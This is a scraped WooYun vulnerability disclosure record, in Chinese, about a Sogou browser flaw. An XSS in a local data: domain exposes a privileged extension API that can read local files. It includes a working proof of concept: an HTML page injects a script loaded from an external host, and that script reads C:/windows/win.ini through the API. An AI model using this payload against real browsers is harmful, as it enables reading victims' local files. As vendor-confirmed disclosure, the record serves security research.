{"id": 86936, "wybug_id": "wooyun-2016-0176436", "wybug_title": "搜狗浏览器跨域漏洞+本地文件泄露漏洞（附带POC代码）", "wybug_corp": "搜狗", "wybug_author": "隐形人真忙", "wybug_date": "2016-02-17 15:40", "wybug_open_date": "2016-05-21 10:50", "wybug_type": "设计错误/逻辑缺陷", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["逻辑错误", "客户端程序设计错误", "浏览器"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-02-17：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-02-21：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-02-24：\t细节向第三方安全合作伙伴开放（绿盟科技、唐朝安全巡航、无声信息）\t\t\t\t\t\t\t\t\t2016-04-16：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-04-26：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-05-06：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-05-21：\t细节向公众公开  简要描述： 都怪二哥！现在命令执行越来越难挖了！ 详细说明：  最新版本的搜狗浏览器：\n\n在研究插件的时候，发现了一个勉强算是本地域的东西：data:text/html,chromewebdata\n\n看到页面上有URL上的回显，测试一下：\n\n既然有回显，自然而然上payload进行测试，提交：\n\n发现了XSS，又测试发现，这个域居然支持调用external中的方法，并且很全且没有限制。于是想找个命令执行的方法。但是现在搜狗浏览器加固了协议跳转，不允许http域向插件域进行跳转，于是测试该域下能否跳转，结果会被当做弹出窗口拦截。所以只能看看external接口中是否可以继续利用的了。在侧边栏管理页面中，通读代码，发现一处片段：\ngetAllSidebarExts: function() {\t\twindow.external.extension(\"getAllSidebarExts\", \"objUtil.onGotAllSidebarExts\");\t},\tgetRecommendSidebarExts: function(strUrl) {\t\twindow.external.extension(\"getRecommendSidebarExts\", \"\"/* url */, \"objUtil.onGotRecommendSidebarExts\");\t},\tinstallExt: function(objExtInfo) {\t\t// ui\t\tobjExtInfo.target.textContent = \"安装中...\";\t\t// call browser\t\twindow.external.extension(\"installExtFromSidebarBox\", objExtInfo.extKey, objExtInfo.extVersion, objExtInfo.extTitle, '' + objExtInfo.extPos, '' + objExtInfo.extSidePos, objExtInfo.extTitle, \"objUtil.onInstallExtCallback\");\t},\n在extension函数中，第一个参数为getRecommendSidebarExts时，根据该参数的名字，推测应该是推荐插件的列表，第二个参数是url，第三个参数是回调。自己定义一个回调函数，看看arguments里都有啥：\n\n居然可以拿到针对于第二个参数url的response，由于是特权API，所以也不存在SOP策略了。测试一下本地文件：\n\n也是可以返回的，既然支持file域请求，那么就可以通过读取本地的文件夹找到敏感文件名，直接对本地文件进行读取了。POC：\n<html><head><meta http-equiv=\"content-type\" content=\"text/html;charset=utf-8\"></head><body><a href=\"data:text/html,chromewebdata<img src=x onerror=location.href='se-extension://ext15485894/html/balloon_for_mse.html'>\" rel=\"noreferrer\">click</a><script>location.href = \"data:text/html,chromewebdata<img src=x onerror=s=createElement('script');body.appendChild(s);s.src='**.**.**.**/browser/evil.js'>\";</script></body></html>\nevil.js:\nfunction ov(){    data = arguments[0] ;    data = JSON.parse(data) ;    console.log(data) ;}var data ;window.external.extension(\"getRecommendSidebarExts\", \"file:///C:/windows/win.ini\", \"ov\");\n   漏洞证明：  见详细说明   修复方案：  见详细说明   版权声明：转载请注明来源 隐形人真忙@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2016-02-21 10:47 厂商回复： 感谢支持 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-02-17 16:38 |    \t\tSai、 \t\t\t( 路人 |\t\t\t        Rank:14 漏洞数:4        | for fun……)\t\t \n  前排抢座，你果然还是挖出来了哈哈哈……    \n     2016-02-17 16:41 |    \t\t坏男孩-A_A \t\t\t( 实习白帽子  |\t\t\t        Rank:81 漏洞数:23        | 膜拜学习中)\t\t \n  niubility    \n     2016-02-17 17:42 |    \t\t牛肉包子 \t\t\t( 普通白帽子  |\t\t\t        Rank:307 漏洞数:70        | baozisec)\t\t \n  http://ceukelai.re/a-tale-of-two-offline-chrome-uxss-vulns/ 这个吗    \n     2016-02-21 23:30 |    \t\t隐形人真忙 \t\t\t( 普通白帽子  |\t\t\t        Rank:169 漏洞数:21        | 关注安全研发与漏洞)\t\t \n  @牛肉包子 并不是    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}